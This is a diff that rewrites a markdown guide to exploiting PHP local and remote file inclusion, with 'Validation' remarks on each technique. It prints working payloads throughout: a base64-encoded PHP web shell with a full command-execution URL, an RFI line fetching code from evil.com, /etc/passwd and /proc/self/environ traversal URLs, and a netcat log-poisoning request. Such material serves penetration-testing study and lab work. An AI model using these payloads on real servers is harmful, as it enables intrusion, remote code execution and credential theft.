@@ -1,36 +1,194 @@
-#### PHP Wrappers
-PHP wrappers are part of PHP's functionality that allows users access to various data streams. Wrappers can also access or execute code through built-in PHP protocols, which may lead to significant security risks if not properly handled.
+## Exploiting File Inclusion Vulnerabilities: LFI and RFI
+
+### Table of Contents
+1. [Local File Inclusion (LFI)](#1-local-file-inclusion-lfi)
+2. [Remote File Inclusion (RFI)](#2-remote-file-inclusion-rfi)
+3. [PHP Wrappers](#3-php-wrappers)
+4. [Data Wrappers](#4-data-wrappers)
+5. [PHP Session Files](#5-php-session-files)
+6. [Log Poisoning](#6-log-poisoning)
+7. [Additional Exploitation Methodologies](#7-additional-exploitation-methodologies)
+   - [Null Byte Injection](#71-null-byte-injection)
+   - [Path Traversal with Encoding](#72-path-traversal-with-encoding)
+   - [Zip Wrapper for Code Execution](#73-zip-wrapper-for-code-execution)
+   - [Proc Filesystem Exploitation](#74-proc-filesystem-exploitation)
+
+---
+
+### 1. Local File Inclusion (LFI)
+**Description**: LFI allows attackers to include files already present on the server by manipulating input parameters.
+
+**Example**:
 ```php
+<?php
+  include($_GET['page']); // Vulnerable code
+?>
+```
+**URL**:
+```
+http://example.com/index.php?page=about.php
+```
+**Attack**:
+```
+http://example.com/index.php?page=../../../../etc/passwd
+```
+This may expose sensitive files like `/etc/passwd` if input isn’t sanitized.
+
+**Validation**: Correct. The example demonstrates a classic LFI vulnerability. Path traversal (`../`) is used to navigate the filesystem. However, modern systems may have protections like `open_basedir` or input validation, which can limit this attack.
+
+---
+
+### 2. Remote File Inclusion (RFI)
+**Description**: RFI allows attackers to include remotely hosted files, potentially executing malicious code.
+
+**Example**:
+```php
+<?php
+  include($_GET['page']); // Vulnerable code
+?>
+```
+**URL**:
+```
+http://example.com/index.php?page=http://evil.com/malicious.php
+```
+If `allow_url_include` is enabled in `php.ini`, the remote script executes on the server.
+
+**Validation**: Accurate, but RFI is less common today because `allow_url_include` is disabled by default in PHP since version 5.2. Ensure the remote file has a `.php` extension or is executable, as servers may reject non-PHP files.
+
+---
+
+### 3. PHP Wrappers
+**Description**: PHP wrappers (e.g., `php://filter`) allow access to data streams, enabling file reading or code execution.
+
+**Example (File Reading)**:
+```
 php://filter/convert.base64-encode/resource=/etc/passwd
 ```
-Once the application processes this payload, the server will return an encoded content of the passwd file. Then decode the base64 encoded data. PHP wrappers can also be used not only for reading files but also for ```code execution```. We will use the PHP code ```<?php system($_GET['cmd']); echo 'Shell done!'; ?>``` as our payload and ```PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+``` is the encoded base64 format of the PHP code. The full value of the payload, when encoded to base64, will be 
+The server returns the base64-encoded content of `/etc/passwd`, which can be decoded.
+
+**Example (Code Execution)**:
+Payload:
+```php
+<?php system($_GET['cmd']); echo 'Shell done!'; ?>
 ```
-php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
+Base64-encoded:
 ```
-After sending the payload add ```&cmd=whoami``` after the ```+``` sign. Not before, because it is important to not include the &cmd=whoami in the input field since it will be encoded when the form is submitted. Once encoded, the backend will treat it as part of the base64 code, giving you an invalid byte sequence error.
-#### Data Wrappers
-The data stream wrapper is another example of PHP's wrapper functionality. The ```data://``` wrapper allows inline data embedding. It is used to embed small amounts of data directly into the application code.
-```txt
-data:text/plain,<?php%20phpinfo();%20?>
+PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
 ```
-This Payload could cause PHP code execution, displaying the PHP configuration details.
-#### PHP Session Files
-PHP session files can also be used in an LFI attack, leading to Remote Code Execution, particularly if an attacker can manipulate the session data. In a typical web application, session data is stored in files on the server. If an attacker can inject malicious code into these session files, and if the application includes these files through an LFI vulnerability, this can lead to code execution.
-##### Exploitation
-An attacker could exploit this vulnerability by injecting a PHP code into their session variable by using ```<?php echo phpinfo(); ?>``` in the page parameter.
+Full URL:
 ```
-<?php echo phpinfo(); ?>
+http://example.com/index.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=whoami
 ```
-This code is then saved in the session file on the server. Subsequently, the attacker can use the LFI vulnerability to include this session file. Since session IDs are hashed, the ID can be found in the cookies section of your browser. Accessing the Path ```/var/lib/php/sessions/sess_[sessionID]``` will execute the injected PHP code in the session file. Note that you have to replace ```[sessionID]``` with the value from your PHPSESSID cookie.
-#### Log Poisoning
-Log poisoning is a technique where an attacker injects executable code into a web server's log file and then uses an LFI vulnerability to include and execute this log file. This method is particularly stealthy because log files are shared and are a seemingly harmless part of web server operations. In a log poisoning attack, the attacker must first inject malicious PHP code into a log file. This can be done in various ways, such as crafting an evil user agent, sending a payload via URL using Netcat, or a referrer header that the server logs. Once the PHP code is in the log file, the attacker can exploit an LFI vulnerability to include it as a standard PHP file. This causes the server to execute the malicious code contained in the log file, leading to RCE.
-##### Exploitation:
-Start nc on target server.
+This decodes and executes the payload, running the `whoami` command.
+
+**Validation**: Mostly correct. The `php://filter` wrapper is a powerful LFI technique. However, the `data://` wrapper is better categorized separately (see below). Also, `php://filter` requires precise syntax, and some servers may block `base64-decode` due to security filters.
+
+---
+
+### 4. Data Wrappers
+**Description**: The `data://` wrapper embeds inline data, often for code execution.
+
+**Example**:
 ```
-nc 10.10.173.214 80             
+data://text/plain,<?php%20phpinfo();%20?>
 ```
-Now inject the php code and send. The code will then be logged in the server's access logs.
-```        
-<?php echo phpinfo(); ?>
+This executes `phpinfo()`, revealing server configuration.
+
+**Validation**: Correct. The `data://` wrapper is effective for RFI when `allow_url_include` is enabled. Ensure URL-encoding (e.g., `%20` for spaces) is used correctly to avoid syntax errors.
+
+---
+
+### 5. PHP Session Files
+**Description**: Attackers inject malicious code into session files, then use LFI to include and execute them.
+
+**Exploitation**:
+1. Inject PHP code (e.g., `<?php echo phpinfo(); ?>`) into a session variable via a parameter.
+2. The code is stored in a session file (e.g., `/var/lib/php/sessions/sess_[sessionID]`).
+3. Use LFI to include the session file:
 ```
-The attacker then uses LFI to include the access log file: ```/var/log/apache2/access.log```
+http://example.com/index.php?page=/var/lib/php/sessions/sess_[sessionID]
+```
+Replace `[sessionID]` with the `PHPSESSID` cookie value.
+
+**Validation**: Accurate. This technique requires control over session data and knowledge of the session file path. It’s effective but depends on predictable session storage and lax input validation.
+
+---
+
+### 6. Log Poisoning
+**Description**: Attackers inject PHP code into server logs, then use LFI to include and execute the log file.
+
+**Exploitation**:
+1. Inject PHP code (e.g., `<?php echo phpinfo(); ?>`) into logs via:
+   - User-Agent header
+   - Malicious URL (e.g., `GET /<?php echo phpinfo(); ?>`)
+   - Referrer header
+2. Use Netcat to send the payload:
+   ```
+   nc 10.10.173.214 80
+   GET /<?php echo phpinfo(); ?> HTTP/1.1
+   Host: example.com
+   ```
+3. Include the log file via LFI:
+   ```
+   http://example.com/index.php?page=/var/log/apache2/access.log
+   ```
+
+**Validation**: Correct, but log poisoning requires write access to logs (e.g., via HTTP requests) and knowledge of the log file path. Modern servers may sanitize logs or restrict LFI to prevent this.
+
+---
+
+### 7. Additional Exploitation Methodologies
+
+#### 7.1 Null Byte Injection
+**Description**: Older PHP versions (<5.3) allowed null byte (`%00`) to truncate file paths, bypassing extension checks.
+
+**Example**:
+```
+http://example.com/index.php?page=/etc/passwd%00
+```
+The `%00` null byte tricks the server into ignoring anything after it (e.g., `.php` suffix).
+
+**Note**: This is obsolete in modern PHP due to stricter input handling but may work on legacy systems.
+
+---
+
+#### 7.2 Path Traversal with Encoding
+**Description**: Attackers use encoded characters (e.g., URL, double URL, or UTF-8 encoding) to bypass filters.
+
+**Example**:
+```
+http://example.com/index.php?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd
+```
+`%2e%2e%2f` decodes to `../`, allowing directory traversal.
+
+**Use Case**: Effective against weak input sanitization that fails to decode URLs before processing.
+
+---
+
+#### 7.3 Zip Wrapper for Code Execution
+**Description**: The `zip://` wrapper allows including files within a zip archive, potentially executing code.
+
+**Exploitation**:
+1. Create a zip file (`malicious.zip`) containing a PHP file (e.g., `shell.php` with `<?php system($_GET['cmd']); ?>`).
+2. Upload the zip file to the server (if possible) or host it remotely.
+3. Use LFI to include:
+   ```
+   http://example.com/index.php?page=zip://malicious.zip#shell.php
+   ```
+
+**Note**: Requires `zip` extension enabled and a way to place the zip file on the server.
+
+---
+
+#### 7.4 Proc Filesystem Exploitation
+**Description**: On Linux, the `/proc` filesystem contains runtime data that can be included via LFI to leak sensitive information.
+
+**Example**:
+```
+http://example.com/index.php?page=/proc/self/environ
+```
+This may reveal environment variables, including database credentials or API keys.
+
+**Use Case**: Useful for reconnaissance when direct file access is restricted.
+
+---
